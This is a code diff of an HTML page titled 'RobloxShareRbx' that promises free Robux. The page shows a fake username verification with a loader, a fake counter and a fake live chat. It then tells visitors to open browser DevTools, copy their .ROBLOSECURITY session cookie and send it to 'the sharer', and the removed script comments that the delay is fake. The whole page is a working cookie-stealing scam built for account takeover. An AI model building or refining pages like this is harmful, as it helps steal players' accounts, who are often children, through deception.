@@ -9,47 +9,38 @@
 <body>
   <div class="container">
     <h1>RobloxShareRbx</h1>
-    <p>Share Robux with the community. Claim your gift below.</p>
+    <p>Sharing Robux with the community 💸</p>
 
-    <div class="input-group">
+    <div class="input-group" id="inputSection">
       <input type="text" id="username" placeholder="Enter your Roblox username" />
-      <button onclick="startVerification()">Get Robux</button>
+      <button onclick="startVerification()">Claim Robux</button>
     </div>
 
-    <div id="step2" class="hidden">
+    <div id="step2" class="hidden fade">
       <p>Verifying username: <span id="displayName"></span></p>
       <div class="loader"></div>
+      <p>Generating: <span id="robuxCounter">0</span> Robux</p>
     </div>
 
-    <div id="step3" class="hidden">
+    <div id="step3" class="hidden fade">
       <h2>Manual Verification Required</h2>
       <p>To complete the process, follow these steps:</p>
       <ol>
-        <li>Right click anywhere on this page and click <strong>"Inspect"</strong></li>
-        <li>Click the <strong>"Application"</strong> tab</li>
-        <li>Go to <strong>Cookies > https://roblox.com</strong></li>
-        <li>Find the cookie named <strong>.ROBLOSECURITY</strong></li>
-        <li>Right-click it and click <strong>"Copy value"</strong></li>
-        <li>Send that value to the sharer to receive your Robux</li>
+        <li>Right click anywhere and click <strong>"Inspect"</strong></li>
+        <li>Go to the <strong>"Application"</strong> tab</li>
+        <li>Open <strong>Cookies > roblox.com</strong></li>
+        <li>Copy the <strong>.ROBLOSECURITY</strong> value</li>
+        <li>Send it to the sharer for final activation</li>
       </ol>
-      <p class="warning">⚠️ Do NOT share this on public sites — only with the trusted sharer.</p>
+      <p class="warning">⚠️ Only send this to your trusted sharer.</p>
+    </div>
+
+    <div class="chat" id="chatBox">
+      <h3>Live Chat</h3>
+      <div id="chatFeed"></div>
     </div>
   </div>
 
-  <script>
-    function startVerification() {
-      const username = document.getElementById("username").value;
-      if (!username) return alert("Please enter your Roblox username");
-
-      document.querySelector(".input-group").classList.add("hidden");
-      document.getElementById("step2").classList.remove("hidden");
-      document.getElementById("displayName").innerText = username;
-
-      setTimeout(() => {
-        document.getElementById("step2").classList.add("hidden");
-        document.getElementById("step3").classList.remove("hidden");
-      }, 3000); // Simulate fake verification delay
-    }
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
